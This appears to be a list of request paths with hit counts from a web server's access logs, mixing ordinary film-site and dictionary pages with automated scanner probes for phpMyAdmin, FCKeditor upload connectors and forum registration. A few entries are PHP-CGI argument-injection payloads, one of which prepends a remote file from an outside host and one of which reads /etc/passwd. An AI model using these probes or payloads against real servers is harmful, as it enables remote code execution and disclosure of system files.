1;//phpMyAdmin-2.8.0/
1;//phpMyAdmin-2.8.1-rc1/
1;//phpMyAdmin-2.8.1/
1;//phpMyAdmin-2.8.2.2/scripts/setup.php
1;//phpMyAdmin-2.8.2/
1;//phpMyAdmin-2.9.0.3/scripts/setup.php
1;//phpMyAdmin-2/
1;//phpMyAdmin-3.0.0-all-languages/scripts/setup.php
1;//phpMyAdmin-3.0.0-rc2/scripts/setup.php
1;//phpMyAdmin-3.0.0/scripts/setup.php
1;//phpMyAdmin-3.0.1.1-all-languages/scripts/setup.php
1;//phpMyAdmin-3.4.9-all-languages/scripts/setup.php
1;//phpMyAdmin-3.4.9-english/scripts/setup.php
1;//phpMyAdmin-3.4.9/scripts/setup.php
1;//phpMyAdmin-3.5.0-beta1-all-languages/scripts/setup.php
1;//phpMyAdmin-3.5.0-beta1-english/scripts/setup.php
1;//phpMyAdmin-3.5.0/scripts/setup.php
1;//phpMyAdmin-english/scripts/setup.php
1;//phpmyadmin.old/main.php
1;//phpmyadmin2/
1;//phpMyAdmin2/
1;//phpmyadmin2/main.php
1;//phpMyAdmin2011/scripts/setup.php
1;//phpMyAdmin211/scripts/setup.php
1;//phpmyadmin29/scripts/setup.php
1;//phpmysql/scripts/setup.php
1;//phpmysql/sql/scripts/setup.php
1;//pma//scripts/setup.php
1;//pma/main.php
1;//pma1/scripts/setup.php
1;//pma2005/
1;//PMA2005/
1;//pmabd/scripts/setup.php
1;//pmy/scripts/setup.php
1;//PMYADM/phpMyAdmin-2.10.0.2-english/scripts/setup.php
1;//scripts/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//sgl/scripts/setup.php
1;//shop/admin/includes/javascript/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//shop/admin/includes/stylesheet.css
1;//sqladmin//scripts/setup.php
1;//sqlmanager/
1;//sqlweb/
1;//store/admin/includes/stylesheet.css
1;//tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//vb/includes/xml/bitfield_vbseo.xml
1;//vbulletin/includes/xml/bitfield_vbseo.xml
1;//webadmin/
1;//zc/admin/includes/stylesheet.css
1;//zen/admin/includes/stylesheet.css
1;//zen/zp-core/zp-extensions/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//zencart/admin/includes/stylesheet.css
1;//zenphoto/zp-core/zp-extensions/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;/;
1;/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dhttp://nettrans.ru/1.txt
1;/?-nd+auto_prepend_file%3D/etc/passwd
1;/?author=2
1;/?author=3
1;/?feed=rss2
1;/?q=adminindex.php
1;/?q=imce
1;/?t=1354628043213
1;/]
1;/_admin/
1;/_admin/fck/editor/filemanager/upload/test.html
1;/_admin/fckeditor/editor/filemanager/upload/test.html
1;/_admin/FCKeditor/editor/filemanager/upload/test.html
1;/_vti_bin/owssvr.dll?UL=1&ACT=4&BUILD=4518&STRMVER=4&CAPREQ=0
1;/++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++Result:+%EF%EE%E4%F5%EE%E4%FF%F9%E8%E9+%EA%EE%ED%F2%E5%ED%F2+%ED%E5+%EE%E1%ED%E0%F0%F3%E6%E5%ED
1;/</strong>)
1;/2011/08/20/popularste-bremszylinder-auktionen-2/
1;/about.htm
1;/about.html
1;/addons/fckeditor2rc2/editor/filemanager/browser/default/connectors/php/connector.php
1;/adm/fck/editor/filemanager/upload/test.html
1;/adm/fckeditor/editor/filemanager/upload/test.html
1;/adm/FCKeditor/editor/filemanager/upload/test.html
1;/adm/style/tooltip.js
1;/admin/backup.php/login.php?action=backup
1;/admin/fck/editor/filemanager/upload/test.html
1;/admin/fck/fckconfig.js
1;/admin/FCK/fckconfig.js
1;/admin/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F
1;/admin/fckeditor/editor/filemanager/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F
1;/admin/FCKeditor/editor/filemanager/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F
1;/admin/FCKeditor/editor/filemanager/upload/php/upload.php
1;/admin/fckeditor/editor/filemanager/upload/test.html
1;/admin/FCKeditor/editor/filemanager/upload/test.html
1;/admin/fckeditor/fckconfig.js
1;/admin/FCKeditor/fckconfig.js
1;/admin/include/FCKeditor/editor/filemanager/browser/mcpuk/connectors/php/config.php
1;/admin/include/fckeditor/fckconfig.js
1;/admin/include/FCKeditor/fckconfig.js
1;/admin/login
1;/admin/spaw/spacer.gif
1;/admincp
1;/administrator/components/com_jce/jce.xml
1;/administrator/logout.php
1;/animation
1;/animation/action
1;/animation/adventure
1;/animation/animaciya
1;/animation/anime
1;/animation/biografiya
1;/animation/boevye-iskusstva
1;/animation/comedy
1;/animation/detective
1;/animation/detskiy
1;/animation/documental
1;/animation/drama
1;/animation/fantasy
1;/animation/history
1;/animation/horror
1;/animation/korotkometrazhnyij
1;/animation/kriminal
1;/animation/last
1;/animation/melodrama
1;/animation/muzyka
1;/animation/mystic
1;/animation/myuzikl
1;/animation/new
1;/animation/parodiya
1;/animation/popular
1;/animation/russkie-multfilmy
1;/animation/russkie-multserialy
1;/animation/scifiction
1;/animation/semejnyij
1;/animation/sex
1;/animation/skazka
1;/animation/sovetskie-multfilmy
1;/animation/sport
1;/animation/triller
1;/animation/voenniy
1;/animation/western
1;/animation/zarubezhnye-multfilmy
1;/animation/zarubezhnye-multserialy
1;/apanel/login.php
1;/apple-touch-icon-144x144-precomposed.png
1;/apple-touch-icon-144x144.png
1;/article-sarkozy-seul-a-kaboul-56143404.html
1;/assets/cache/siteCache.idx.php
1;/assets/index.html
1;/atilektcms/
1;/atilektcms/login.aspx?ReturnUrl=/atilektcms/default.aspx
1;/blog/wp-admin/
1;/blog/wp-includes/js/prototype.js
1;/blog/wp-trackback.php
1;/board/
1;/board/index.php?app=core&module=global&section=register&coppa_user=&termsread=1&coppa_pass=1
1;/board/profile.php?mode=register&agreed=true
1;/board/register.php?do=register
1;/board/ucp.php?mode=register&agreed=true
1;/boatilekt/login.aspx
1;/camps
1;/camps/140
1;/camps/workers/410
1;/campsoverview
1;/catalog.php?class=1&type=1
1;/cgi-bin/CMS/getcontent.cgi?template=LoginPage&alias=nicht
1;/cgi-bin/djem/djemserver
1;/cgi-bin/djem/djemserver.cgi
1;/cgi-bin/djemserver
1;/clientscript/vbulletin_global.js
1;/cms/admin/index.php
1;/CMS/getcontent.cgi?template=LoginPage&alias=nicht
1;/cms/kernel/admin.php
1;/community/
1;/company
1;/company.htm
1;/company.html
1;/company.php
1;/contact.htm
1;/contact.html
1;/contact.php
1;/contacts.htm
1;/contacts.html
1;/contacts.php
1;/content_cache/urls
1;/core/js/common.js
1;/core/packages/.gitignore
1;/data/evnanfgpxkptzn?cli=10&ver=spkyf-1.4.9&dat=ns&ref=&url=http%3A%2F%2FEORU.RU
1;/domain/admin/
1;/e107_admin/admin.php
1;/editors/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php
1;/elsxuti/
1;/en/
1;/engine/classes/js/dle_js.js
1;/engine/download.php?id=1114
1;/engine/js/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php
1;/engine/print.php?newsid=0
1;/engine/rss.php
1;/eoru.ru/gram/my_journal/tag/Mysli
1;/eoturu/grda/ieldefo.
1;/erotik-videolar.ru
1;/Falt4/modules/newsletter/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php
1;/fck/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F
1;/FCK/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F
1;/fck/editor/filemanager/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F
1;/FCK/editor/filemanager/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F
1;/fck/editor/filemanager/upload/php/upload.php
1;/fck/editor/filemanager/upload/test.html
1;/fck/fckconfig.js
1;/FCK/fckconfig.js
1;/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F
1;/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F
1;/fckeditor/editor/filemanager/browser/mcpuk/connectors/php/connector.php
1;/fckeditor/editor/filemanager/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F
1;/FCKeditor/editor/filemanager/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F
1;/fckeditor/editor/filemanager/upload/test.html
1;/FCKeditor/editor/filemanager/upload/test.html
1;/fckeditor/fckconfig.js
1;/FCKeditor/fckconfig.js
1;/FCKEDITOR/fckconfig.js
1;/feedback
1;/feedback.htm
1;/feedback.html
1;/feedback.php
1;/film/100500.html
1;/film/action
1;/film/chuzhoj-rajon.html
1;/film/comedy
1;/film/detective
1;/film/detskiy
1;/film/devushka-iz-gologo-glaza.html
1;/film/documental
1;/film/drama
1;/film/elvin-i-burunduki3.html
1;/film/grobovschik.html
1;/film/horror
1;/film/ivan-tsarevich-i-seryij-volk.html
1;/film/kak-ya-ezdil-v-moskvu.html
1;/film/kriminal
1;/film/krovinushka.html
1;/film/lednikovyij-period-rozhdestvo-mamonta.html
1;/film/lyubov-na-dva-polyusa.html
1;/film/melodrama
1;/film/papashi-2.html
1;/film/podborka-video-prikolov-1-nedelya.html
1;/film/podborka-video-prikolov-2-nedelya.html
1;/film/reka.html
1;/film/russkie-multfilmy
1;/film/russkij-film
1;/film/russkij-serial
1;/film/semejnyij
1;/film/shou-meddisona.html
1;/film/triller
1;/film/turnir-dolinyi-fej.html
1;/film/ukraina-chudes.html
1;/film/valera-tv.html
1;/film/vosproizvedenie.html
1;/film/zarubezhnye-multfilmy
1;/film/zarubezhnye-multserialy
1;/film/zarubezhnyj-serial
1;/film/zhit-budete.html
1;/forum
1;/forum/admincp
1;/forum/index.php?app=core&module=global&section=register&coppa_user=&termsread=1&coppa_pass=1
1;/forum/jscripts/ipb_topic.js
1;/forum/profile.php?mode=register&agreed=true
1;/forum/register.php?do=register
1;/forum/ucp.php?mode=register&agreed=true
1;/forum1/index.php?app=core&module=global&section=register&coppa_user=&termsread=1&coppa_pass=1
1;/forum1/profile.php?mode=register&agreed=true
1;/forum1/register.php?do=register
1;/forum1/ucp.php?mode=register&agreed=true
1;/forum2/index.php?app=core&module=global&section=register&coppa_user=&termsread=1&coppa_pass=1
1;/forum2/profile.php?mode=register&agreed=true
1;/forum2/register.php?do=register
1;/forum2/ucp.php?mode=register&agreed=true
1;/forums/
1;/forums/index.php?app=core&module=global&section=register&coppa_user=&termsread=1&coppa_pass=1
1;/forums/profile.php?mode=register&agreed=true
1;/forums/register.php?do=register
1;/forums/ucp.php?mode=register&agreed=true
1;/fun
1;/fun/comedy
1;/fun/detskiy
1;/fun/korotkometrazhnyij
1;/fun/last
1;/fun/new
1;/fun/parodiya
1;/fun/popular
1;/Googlebot/2.1;%20<h2><a%20href="http:/mediakirov.ru">%f1%ee%e7%e4%e0%ed%e8%e5%20%f1%e0%e9%f2%ee%e2%20%e2%20%ca%e8%f0%ee%e2%e5</a></h2>%20http:/mediakirov.ru/www.mediakirov.ru
1;/gram/%5Bobject%20Object%5D://www.bflix.info/worker/init.js?b=2&l=0
1;/gram/10index.php
1;/gram/12/++++++++++++++++++++++++++++++++++++++++++++++++++++++++++Result:+%ED%E5+%ED%E0%F8%EB%EE%F1%FC+%F4%EE%F0%EC%FB+%E4%EB%FF+%EE%F2%EF%F0%E0%E2%EA%E8;+Result:+%F1%EA%F0%E8%EF%F2%EE%E7%E0%F9%E8%F2%E0+%E4%E5%F8%E8%F4%F0%EE%E2%E0%ED%E0;+%ED%E5+%ED%E0%F8%EB%EE%F1%FC+%F4%EE%F0%EC%FB+%E4%EB%FF+%EE%F2%EF%F0%E0%E2%EA%E8;
1;/gram/12+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++Result:+%ED%E5+%ED%E0%F8%EB%EE%F1%FC+%F4%EE%F0%EC%FB+%E4%EB%FF+%EE%F2%EF%F0%E0%E2%EA%E8;
1;/gram/13+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++Result:+%F2%E0%EA%EE%E9+%F2%EE%EF%E8%EA+%F3%E6%E5+%F1%F3%F9%E5%F1%F2%E2%F3%E5%F2;
1;/gram/14ournal/tag/Obzor
1;/gram/15index.php
1;/gram/8index.php
1;/gram/admin.php
1;/gram/administrator/index.php
1;/gram/cache/7c98c425e32af03fd6e78da12d7d49f4
1;/gram/cache/ce4ec0b0b7295bcce4706990944d324d
1;/gram/my_journal/tag/Mysli
1;/gram/text/javascript
1;/gram/undefined
1;/gram/vortaro.reformal.ru
1;/gram/wp-login.php
1;/gram10
1;/gram5
1;/gramm5
1;/havascripru.ru/gram:
1;/help
1;/help-for-site
1;/help.htm
1;/hostcmsfiles/main.js
1;/i34czx.txt
1;/includes.php
1;/includes/general.js
1;/includes/init.php
1;/index.php?-s
1;/index.php?app=core&module=global&section=register&coppa_user=&termsread=1&coppa_pass=1
1;/index.php?do=register
1;/index.php?nn_qp=1&url=http://www.nonumber.nl/
1;/index.php?option=com_user&view=reset&layout=confirm
1;/index/index.php?app=core&module=global&section=register&coppa_user=&termsread=1&coppa_pass=1
1;/index/profile.php?mode=register&agreed=true
1;/index/register.php?do=register
1;/index/ucp.php?mode=register&agreed=true
1;/info%2BYegor%40gmail.com
1;/info.htm
1;/info.html
1;/info.php
1;/info/mailto:igorsafonov@gmail.com?subject=Pri%20la%20pagxaro
1;/info/undefined
1;/ipboard/
1;/js/easy.php
1;/keywords.txt
1;/lassName=%E5%BA%94%E7%94%A8%E6%A1%88%E4%BE%8B&Smallclassname=%E7%94%B5%E5%AD%90%E8%A1%8C%E4%B8%9A%E7%BA%BF%E6%A3%92%E5%BA%94%E7%94%A8
1;/links.php?id=combay.ru
1;/login.php
1;/mailto:igorsafonov@gmail.com?subject=Pri%20la%20pagxaro
1;/map
1;/map.htm
1;/map.html
1;/map.php
1;/mod/article/tpl/article_list.html
1;/mod/catalog/tpl/catalog_edit_product.html
1;/mod/forms/tpl/forms_edit.html
1;/mod/shop/tpl/shop_orders.html
1;/mod/subscription/.default/tpl/subscription.html
1;/modules/taxonomy/taxonomy.css
1;/MSOffice/cltreq.asp?UL=1&ACT=4&BUILD=4518&STRMVER=4&CAPREQ=0
1;/myadmin/scripts/setup.php
1;/nuke/FCKeditor/editor/filemanager/browser/default/connectors/php/commands.php
1;/page_bred_34895/
1;/pages/mots-4561053.html
1;/partners
1;/people
1;/phpshop/admpanel/
1;/plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/upload.php
1;/pmwiki.php
1;/pmwiki/pmwiki.php
1;/pri%20and%20true=true/
1;/pri/
1;/pri/3index.php
1;/pri/cache/771c959658e88f4755cc19784f225893
1;/pri/httbutton
1;/profile.php?mode=register&agreed=true
1;/public/fckeditor/editor/filemanager/upload/php/upload.php
1;/published/login.php
1;/readme.html
1;/register.php?do=register
1;/REGTIME-REG-RIPN/2010-09-10/
1;/reklama
1;/ru
1;/ru/
1;/s
1;/search.html
1;/ser%C3%84%E2%80%B0o/suferi
1;/ser%C4%89o/vato%20II
1;/ser%C4%89o/vatto
1;/ser%C4%EF%BF%BDo/koncerni
1;/ser%C4%EF%BF%BDo/kuko
1;/ser%C4%EF%BF%BDo/Ne%C5%ADtono
1;/ser%C4%EF%BF%BDo/planeo
1;/ser?o/cirkvitkarto
1;/ser?o/cirkvittabulo
1;/serco
1;/serco/-en-
1;/serco/brava
1;/serco/femuro
1;/serco/forumo
1;/serco/koncerni
1;/serco/kuko
1;/serco/Neutono
1;/serco/vulgara
1;/sercx/administrator/index.php
1;/sercx/wp-admin/admin.php
1;/sercxo&post=164218694_1297
1;/sercxo.
1;/sercxo/-+%D1%82%D1%83%D0%BC%D0%B0%D0%BD
1;/sercxo/%22cgthfynj
1;/sercxo/%22mk%3A@MSITStore%3AO%3A%5C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%5C%D0%A0%D0%B0%D0%B7%D0%B5%D1%82%D0%B4%D0%B8%D0%BD%D0%BE%D0%B2%20%D0%A0%D0%B0%D0%BD%D0%B8%D1%81%5CXLMAIN11.CHM%3A%3A//html/xlrefUsingshortcutkeys3.htm%23%22
1;/sercxo/%22Standard%20-%20key%20files%20writable%22%20SMF
1;/sercxo/%28traduki
1;/sercxo/%3Feni
1;/sercxo/%3Fesu
1;/sercxo/%3Fiuokaze
1;/sercxo/%5Bjkjl
1;/sercxo/%5C
1;/sercxo/%C2%A0%D0%BF%D1%83%D1%81%D1%82%D1%8C
1;/sercxo/%D0%90%D0%B1%D0%B0%D1%8F+%D0%9A%D1%83%D0%BD%D0%B0%D0%BD%D0%B1%D0%B0%D0%B5%D0%B2
1;/sercxo/%D0%90%D0%BB%D0%B5%D0%BA%D1%81%D0%B0%D0%BD%D0%B4%D1%80+%D0%93%D0%B0%D0%BB%D0%BA%D0%B8%D0%BD
1;/sercxo/%D0%90%D0%BB%D0%B5%D0%BA%D1%81%D0%B5%D1%8F+%D0%92%D0%B0%D0%BB%D0%B5%D1%80%D1%8C%D0%B5%D0%B2%D0%B8%D1%87%D0%B0+%D0%98%D1%81%D0%B0%D0%B5%D0%B2
1;/sercxo/%D0%90%D1%80%D0%BA%D0%B0%D0%B4%D0%B8%D1%8F+%D0%9C%D0%B0%D0%BC%D0%BE%D0%BD%D1%82%D0%BE%D0%B2
1;/sercxo/%D0%91%D0%B0%D1%85%D1%82%D0%B0%D0%B4%D0%B7%D0%B5%2C+%D0%93%D1%80%D0%B8%D0%B3%D0%BE%D1%80%D0%B8%D0%B9+%D0%93%D0%B5%D0%BE%D1%80%D0%B3%D0%B8%D0%B5%D0%B2%D0%B8%D1%87
1;/sercxo/%D0%91%D0%B5%D1%82%D1%82%D0%B8%D0%BD%D1%8B+%D0%92%D1%83%D0%BB%D1%8C%D1%84
1;/sercxo/%D0%91%D1%8B%D0%BB%D0%BE%2C+%D0%B4%D0%B5%D0%B2%D0%BA%D0%B8%2C+%D0%B1%D1%8B%D0%BB%D0%BE
1;/sercxo/%D0%91.+%D0%92.+%D0%9A%D0%BE%D0%BD%D0%B4%D1%80%D0%B0%D1%82%D1%8C%D0%B5
1;/sercxo/%D0%93.+%D0%92%D0%B0%D1%80%D0%B5%D0%BD%D0%B3%D1%8C%D0%B5%D0%BD
1;/sercxo/%D0%94%D0%A0%D0%B6%D0%B1%D1%8B+%D0%BD%D0%B0%D1%80%D0%BE%D0%B4%D0%BE%D0%B2
1;/sercxo/%D0%94%D0%B5%D0%B4+%D0%9C%D0%B0%D1%81%D1%82%D0%B4%D0%B0%D0%B9+%D0%B8+%D0%B7%D0%B0%D0%B9%D1%86%D1%8B
1;/sercxo/%D0%95%D0%B2%D0%B0+%D0%A3%D1%80%D0%B1%D0%B0%D0%BD%D0%BE%D0%B2%D0%B0
1;/sercxo/%D0%95%D0%B2%D1%80%D0%B0%D0%B7%D0%B8%D0%B9%D1%81%D0%BA%D0%BE%D0%B3%D0%BE+%D1%8D%D0%BA%D0%BE%D0%BD%D0%BE%D0%BC%D0%B8%D1%87%D0%B5%D1%81%D0%BA%D0%BE%D0%B3%D0%BE+%D1%81%D0%BE%D1%8E%D0%B7
1;/sercxo/%D0%95%D0%BB%D0%B5%D0%BD%D0%B0+%D0%93%D0%B0%D0%BB%D0%BA%D0%B8%D0%BD%D0%B0
1;/sercxo/%D0%95.%D0%90.+%D0%9B%D0%B0%D1%85%D0%BC%D0%BE%D1%81%D1%82%D0%BE%D0%B2
1;/sercxo/%D0%97%D0%B0%D0%BC%D0%B5%D1%87%D0%B0%D1%82%D0%B5%D0%BB%D1%8C%D0%BD%D0%BE%2C+%D1%87%D1%82%D0%BE+%D0%BD%D0%B0+%D0%BE%D0%B1%D1%89%D0%B5%D0%BF%D1%80%D0%B8%D0%BD%D1%8F%D1%82%D0%BE%D0%BC+%D1%8F%D0%B7%D1%8B%D0%BA%D0%B5+%D1%83+%D0%BD%D0%B0%D1%81+%D0%B3%D0%BB%D0%B0%D0%B3%D0%BE%D0%BB+%D0%B1%D1%80%D0%B0%D1%82%D1%8C+%D1%83%D0%B6%D0%B5+%D0%BF%D0%BE%D0%B4%D1%80%D0%B0%D0%B7%D1%83%D0%BC%D0%B5%D0%B2%D0%B0%D0%B5%D1%82+%D0%B2+%D1%81%D0%B5%D0%B1%D0%B5+%D0%B2%D0%B7%D1%8F%D1%82%D0%BA%D0%B8%E2%80%A6+%D0%93%D0%BB%D0%B0%D0%B3%D0%BE%D0%BB+%D0%BF%D0%B8%D1%82%D1%8C+%D1%82%D0%B0%D0%BA%D0%B6%D0%B5+%D1%81%D0%B0%D0%BC+%D1%81%D0%BE%D0%B1%D0%BE%D1%8E+%D1%80%D0%B0%D0%B2%D0%BD%D1%8F%D0%B5%D1%82%D1%81%D1%8F+%D0%B3%D0%BB%D0%B0%D0%B3%D0%BE%D0%BB%D1%83+%D0%BF%D1%8C%D1%8F%D0%BD%D1%81%D1%82%D0%B2%D0%BE%D0%B2%D0%B0%D1%82%D1%8C
1;/sercxo/%D0%98%D0%B3%D0%BE%D1%80%D1%8F+%D0%9C%D0%B8%D0%BD%D1%8F%D0%B9%D0%BB%D0%BE
1;/sercxo/%D0%98%D0%BD%D1%82%D0%B5%D1%80%D0%B2%D1%8C%D1%8E+%D0%90%D0%BB%D0%B5%D0%BA%D1%81%D0%B0%D0%BD%D0%B4%D1%80%D0%B0+%D0%9B%D1%83%D0%BA%D0%B0%D1%88%D0%B5%D0%BD%D0%BA%D0%BE+%D1%80%D0%BE%D1%81%D1%81%D0%B8%D0%B9%D1%81%D0%BA%D0%B8%D0%BC+%D0%A1%D0%9C%D0%98
1;/sercxo/%D0%9A%D0%90%D0%9A%20%D0%A3%D0%94%D0%90%D0%9B%D0%98%D0%A2%D0%AC%20ie9
1;/sercxo/%D0%9A%D0%BE%D0%BD%D1%81%D1%82%D0%B0%D0%BD%D1%82%D0%B8%D0%BD+%D0%A1%D0%B5%D0%B4%D0%BE%D0%B2
1;/sercxo/%D0%9C%D0%B0%D1%80%D0%B8%D1%83%D1%88%D0%B5+%D0%92%D0%B0%D1%85%D0%B5
1;/sercxo/%D0%9C%D0%B8%D1%85%D0%B0%D0%B8%D0%BB%D0%B0+%D0%A2%D0%B8%D0%BC%D0%BE%D1%84%D0%B5%D0%B5%D0%B2%D0%B8%D1%87%D0%B0+%D0%9A%D0%B0%D0%BB%D0%B0%D1%88%D0%BD%D0%B8%D0%BA%D0%BE%D0%B2
1;/sercxo/%D0%9D%D0%B5+%D0%B3%D0%BE%D0%BB%D0%BE%D1%81%D1%83%D0%B9%C2%BB+%E2%80%94+%D0%BF%D0%B5%D1%81%D0%BD%D1%8F+%D0%B3%D1%80%D1%83%D0%BF%D0%BF%D1%8B+%C2%AB%D0%9F%D1%83%D1%80%D0%B3%D0%B5%D0%BD
1;/sercxo/%D0%9F%D0%B5%D1%80%D0%B5%D1%85%D0%BE%D0%B4%D0%BD%D0%B8%D0%BA%20%D1%81%20%D1%80%D0%B5%D0%B7%D1%8C%D0%B1%D1%8B%20%D0%9C42%20%D0%BD%D0%B0%20%D0%B1%D0%B0%D0%B9%D0%BE%D0%BD%D0%B5%D1%82%20%D0%9A
1;/sercxo/%D0%9F%D0%B5%D1%80%D0%B5%D1%85%D0%BE%D0%B4%D0%BD%D0%BE%D1%81%D1%82%D1%8C+%D0%B3%D0%BB%D0%B0%D0%B3%D0%BE%D0%BB%D0%BE%D0%B2
1;/sercxo/%D0%9F%D0%BB%D0%BE%D1%81%D0%BA%D0%B8%D0%B9+%D0%A2%D0%BE%D0%BB%D0%B1%D0%B0%D1%87%D0%B8%D0%BA
1;/sercxo/%D0%A0%D0%B5%D0%BD%D0%B5+%D0%B4%D0%B5+%D0%A1%D0%BE%D1%81%D1%81%D1%8E%D1%80
1;/sercxo/%D0%A0%D1%83%D1%81%D1%82%D0%B0%D0%BC+%D0%9C%D0%B8%D0%BD%D0%BD%D0%B8%D1%85%D0%B0%D0%BD%D0%BE%D0%B2
1;/sercxo/%D0%A1%D0%9E%D0%9B%D0%9E%D0%92%D0%95%D0%99+%D0%92%D0%B0%D0%BB%D0%B5%D1%80%D0%B8%D0%B9+%D0%94%D0%BC%D0%B8%D1%82%D1%80%D0%B8%D0%B5%D0%B2%D0%B8%D1%87
1;/sercxo/%D0%A1%D0%B5%D0%BA%D1%83%D0%BD%D0%B4%D0%B0+%D0%BD%D0%B0+%D0%BF%D0%BE%D0%B4%D0%B2%D0%B8%D0%B3
1;/sercxo/%D0%A1%D0%B5%D0%BC%D1%91%D0%BD%D0%BE%D0%B2+%D0%A1.+%D0%9C.%2C+%D0%A2%D0%B5%D1%80%D0%B5%D1%88%D0%BA%D0%BE%D0%B2%D0%B0+%D0%9D.+%D0%90.+%C2%AB%D0%9C%D0%B8%D1%85%D0%B5%D0%B5%D0%B2+%D0%A1%D0%B5%D1%80%D0%B3%D0%B5%D0%B9+%D0%92%D0%B8%D0%BA%D1%82%D0%BE%D1%80%D0%BE%D0%B2%D0%B8%D1%87%C2%BB
1;/sercxo/%D0%A1%D0%B5%D1%80%D0%B3%D0%B5%D1%8F+%D0%9C%D0%B8%D1%85%D0%B0%D0%B9%D0%BB%D0%BE%D0%B2%D0%B8%D1%87%D0%B0+%D0%9D%D0%B8%D0%BA%D0%BE%D0%BB%D1%8C%D1%81%D0%BA%D0%BE%D0%B3%D0%BE
1;/sercxo/%D0%A1%D0%BB%D0%BE%D0%B2%D0%B0%D1%80%D0%B8+%D0%9A%D0%BE%D0%BD%D0%B4%D1%80%D0%B0%D1%82%D1%8C%D0%B5%D0%B2%D0%B0
1;/sercxo/%D0%A1%D1%80%D0%B0%D0%B2%D0%BD%D0%B8%D1%82%D0%B5%D0%BB%D1%8C%D0%BD%D0%B0%D1%8F+%D1%81%D1%82%D0%B5%D0%BF%D0%B5%D0%BD%D1%8C
1;/sercxo/%D0%A1%D1%83%D1%82%D1%8C+%D0%B2%D1%80%D0%B5%D0%BC%D0%B5%D0%BD%D0%B8
1;/sercxo/%D0%A1%D1%8A%D0%B5%D0%B7%D0%B4+%D0%9A%D0%BE%D0%BC%D0%BF%D0%B0%D1%80%D1%82%D0%B8%D0%B8+%D0%9A%D0%9D%D0%A0
1;/sercxo/%D0%AF%20%D0%BB%D1%8E%D0%B1%D0%BB%D1%8E%20%D1%82%D0%B5%D0%B1%D1%8F,%20%D0%BC%D0%BE%D1%8F%20%D1%81%D0%B5%D1%81%D1%82%D1%80%D0%B0
1;/sercxo/%D0%AF%D0%BD%D0%B0+%D0%90%D0%BC%D0%B5%D0%BB%D0%B8%D0%BD%D0%B0
1;/sercxo/%D0%B2%D1%80%D1%8F%D0%B4+%D0%BB%D0%B8
1;/sercxo/%D0%B2%D1%80%D1%8F%D1%82+%D0%BB%D0%B8
1;/sercxo/%D0%B2+%D1%81%D0%BE%D0%BE%D1%82%D0%B2%D0%B5%D1%82%D1%81%D1%82%D0%B2%D0%B8%D0%B8
1;/sercxo/%D0%B3%D0%B0%D0%B9%D0%B4+%D0%BF%D0%BE+%D0%BD%D0%B5%D0%BA%D1%80%D0%BE%D0%BC%D0%B0%D0%BD%D1%82%D1%83+1.12+%D0%B4%D0%B8%D0%B0%D0%B1%D0%BB%D0%BE
1;/sercxo/%D0%B3%D0%B8%D0%BC%D0%BD+%D0%A1%D0%A1%D0%A1%D0%A0
1;/sercxo/%D0%B4%D1%80%D1%83%D0%B3+%D0%B4%D1%80%D1%83%D0%B3%D1%83
1;/sercxo/%D0%B6%D1%83%D1%80%D0%BD%D0%B0%D0%BB%D0%B0+%22Time%22
1;/sercxo/%D0%B8%D0%BC%D0%B5%D1%82%D1%8C+%D0%B2%D0%B2%D0%B8%D0%B4%D1%83
1;/sercxo/%D0%B8%D1%81%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D0%B5%D0%BB%D1%8C%D0%BD%D0%BE-%D1%82%D1%80%D1%83%D0%B4%D0%BE%D0%B2%D1%8B%D1%85+%D0%BB%D0%B0%D0%B3%D0%B5%D1%80%D1%8F
1;/sercxo/%D0%BE%D0%B3%D1%80%D0%B0%D0%BD%D0%B8%D1%87%D0%B5%D0%BD%D0%B8%D0%B5%20%D0%B2%2050%D0%9C%D0%91%20Apple
1;/sercxo/%D0%BE%D1%81%D0%BD%D0%BE%D0%B2%D0%BDh%2C
1;/sercxo/%D0%BF%D0%B0%D1%80%D0%BB%D0%B0%D0%BC%D0%B5%D0%BD%D1%82%D1%81%D0%BA%D0%B8%D1%85+%D0%B2%D1%8B%D0%B1%D0%BE%D1%80%D0%B0%D1%85+%D0%BD%D0%B0+%D0%A3%D0%BA%D1%80%D0%B0%D0%B8%D0%BD%D0%B5
1;/sercxo/%D0%BF%D0%BE%D0%BF%D1%80%D0%B0%D0%B2%D0%BA%D0%B8+%D0%94%D0%B6%D0%B5%D0%BA%D1%81%D0%BE%D0%BD%D0%B0-%D0%92%D1%8D%D0%BD%D0%B8%D0%BA%D0%B0
1;/sercxo/%D0%BF%D0%BE%D1%87%D1%82%D0%BE%D0%B2%D1%8B%D0%B9+%D1%8F%D1%89%D0%B8%D0%BA
1;/sercxo/%D0%BF%D1%80%D0%BE%D0%B4%D0%BE%D0%BB%D0%B6%D0%B0%D1%82+%D1%8C
